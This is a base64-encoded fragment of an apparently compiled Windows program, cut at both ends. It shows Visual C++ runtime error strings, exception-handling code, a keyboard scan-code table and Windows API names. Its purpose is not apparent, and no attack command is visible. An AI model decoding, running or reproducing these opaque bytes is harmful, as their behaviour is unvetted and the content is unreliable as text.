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AcABhAGMAZQAgAGYAbwByACAAXwBvAG4AZQB4AGkAdAAvAGEAdABlAHgAaQB0ACAAdABhAGIAbABlAA0ACgAAAAAAAAAAAFIANgAwADIANQANAAoALQAgAHAAdQByAGUAIAB2AGkAcgB0AHUAYQBsACAAZgB1AG4AYwB0AGkAbwBuACAAYwBhAGwAbAANAAoAAAAAAAAAUgA2ADAAMgA2AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAcwB0AGQAaQBvACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAA0ACgAAAAAAAAAAAFIANgAwADIANwANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGwAbwB3AGkAbwAgAGkAbgBpAHQAaQBhAGwAaQB6AGEAdABpAG8AbgANAAoAAAAAAAAAAABSADYAMAAyADgADQAKAC0AIAB1AG4AYQBiAGwAZQAgAHQAbwAgAGkAbgBpAHQAaQBhAGwAaQB6AGUAIABoAGUAYQBwAA0ACgAAAAAAUgA2ADAAMwAwAA0ACgAtACAAQwBSAFQAIABuAG8AdAAgAGkAbgBpAHQAaQBhAGwAaQB6AGUAZAANAAoAAAAAAAAAAABSADYAMAAzADEADQAKAC0AIABBAHQAdABlAG0AcAB0ACAAdABvACAAaQBuAGkAdABpAGEAbABpAHoAZQAgAHQAaABlACAAQwBSAFQAIABtAG8AcgBlACAAdABoAGEAbgAgAG8AbgBjAGUALgAKAFQAaABpAHMAIABpAG4AZABpAGMAYQB0AGUAcwAgAGEAIABiAHUAZwAgAGkAbgAgAHkAbwB1AHIAIABhAHAAcABsAGkAYwBhAHQAaQBvAG4ALgANAAoAAAAAAFIANgAwADMAMgANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGwAbwBjAGEAbABlACAAaQBuAGYAbwByAG0AYQB0AGkAbwBuAA0ACgAAAAAAUgA2ADAAMwAzAA0ACgAtACAAQQB0AHQAZQBtAHAAdAAgAHQAbwAgAHUAcwBlACAATQBTAEkATAAgAGMAbwBkAGUAIABmAHIAbwBtACAAdABoAGkAcwAgAGEAcwBzAGUAbQBiAGwAeQAgAGQAdQByAGkAbgBnACAAbgBhAHQAaQB2AGUAIABjAG8AZABlACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAAoAVABoAGkAcwAgAGkAbgBkAGkAYwBhAHQAZQBzACAAYQAgAGIAdQBnACAAaQBuACAAeQBvAHUAcgAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAuACAASQB0ACAAaQBzACAAbQBvAHMAdAAgAGwAaQBrAGUAbAB5ACAAdABoAGUAIAByAGUAcwB1AGwAdAAgAG8AZgAgAGMAYQBsAGwAaQBuAGcAIABhAG4AIABNAFMASQBMAC0AYwBvAG0AcABpAGwAZQBkACAAKAAvAGMAbAByACkAIABmAHUAbgBjAHQAaQBvAG4AIABmAHIAbwBtACAAYQAgAG4AYQB0AGkAdgBlACAAYwBvAG4AcwB0AHIAdQBjAHQAbwByACAAbwByACAAZgByAG8AbQAgAEQAbABsAE0AYQBpAG4ALgANAAoAAAAAAFIANgAwADMANAANAAoALQAgAGkAbgBjAG8AbgBzAGkAcwB0AGUAbgB0ACAAbwBuAGUAeABpAHQAIABiAGUAZwBpAG4ALQBlAG4AZAAgAHYAYQByAGkAYQBiAGwAZQBzAA0ACgAAAAAARABPAE0AQQBJAE4AIABlAHIAcgBvAHIADQAKAAAAAABTAEkATgBHACAAZQByAHIAbwByAA0ACgAAAAAAVABMAE8AUwBTACAAZQByAHIAbwByAA0ACgAAAA0ACgAAAAAAcgB1AG4AdABpAG0AZQAgAGUAcgByAG8AcgAgAAAAAABSAHUAbgB0AGkAbQBlACAARQByAHIAbwByACEACgAKAFAAcgBvAGcAcgBhAG0AOgAgAAAAPABwAHIAbwBnAHIAYQBtACAAbgBhAG0AZQAgAHUAbgBrAG4AbwB3AG4APgAAAAAALgAuAC4AAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABWAGkAcwB1AGEAbAAgAEMAKwArACAAUgB1AG4AdABpAG0AZQAgAEwAaQBiAHIAYQByAHkAAAAAAEMATwBOAEkATgAkAAAAAAB0YW5oAAAAAGFzaW4AAAAAYWNvcwAAAABhdGFuAAAAAGF0YW4yAAAAc3FydAAAAABzaW4AY29zAHRhbgBjZWlsAAAAAGZsb29yAAAAZmFicwAAAABtb2RmAAAAAGxkZXhwAAAAX2NhYnMAAABfaHlwb3QAAGZtb2QAAAAAZnJleHAAAABfeTAAX3kxAF95bgBfbG9nYgAAAF9uZXh0YWZ0ZXIAAGV4cABwb3cAbG9nAGxvZzEwAAAAc2luaAAAAABjb3NoAAAAAGZtQAAFAADACwAAAAAAAAAdAADABAAAAAAAAACWAADABAAAAAAAAACNAADACAAAAAAAAACOAADACAAAAAAAAACPAADACAAAAAAAAACQAADACAAAAAAAAACRAADACAAAAAAAAACSAADACAAAAAAAAACTAADACAAAAAAAAAC0AgDACAAAAAAAAAC1AgDACAAAAAAAAAAMAAAAkAAAAAMAAAAJAAAARmxzQWxsb2MAAAAARmxzRnJlZQBGbHNHZXRWYWx1ZQBGbHNTZXRWYWx1ZQBJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uRXgAQ3JlYXRlRXZlbnRFeFcAAENyZWF0ZVNlbWFwaG9yZUV4VwAAU2V0VGhyZWFkU3RhY2tHdWFyYW50ZWUAQ3JlYXRlVGhyZWFkcG9vbFRpbWVyAAAAU2V0VGhyZWFkcG9vbFRpbWVyAABXYWl0Rm9yVGhyZWFkcG9vbFRpbWVyQ2FsbGJhY2tzAENsb3NlVGhyZWFkcG9vbFRpbWVyAAAAAENyZWF0ZVRocmVhZHBvb2xXYWl0AAAAAFNldFRocmVhZHBvb2xXYWl0AAAAQ2xvc2VUaHJlYWRwb29sV2FpdABGbHVzaFByb2Nlc3NXcml0ZUJ1ZmZlcnMAAAAARnJlZUxpYnJhcnlXaGVuQ2FsbGJhY2tSZXR1cm5zAABHZXRDdXJyZW50UHJvY2Vzc29yTnVtYmVyAAAAR2V0TG9naWNhbFByb2Nlc3NvckluZm9ybWF0aW9uAABDcmVhdGVTeW1ib2xpY0xpbmtXAFNldERlZmF1bHREbGxEaXJlY3RvcmllcwAAAABFbnVtU3lzdGVtTG9jYWxlc0V4AENvbXBhcmVTdHJpbmdFeABHZXREYXRlRm9ybWF0RXgAR2V0TG9jYWxlSW5mb0V4AEdldFRpbWVGb3JtYXRFeABHZXRVc2VyRGVmYXVsdExvY2FsZU5hbWUAAAAASXNWYWx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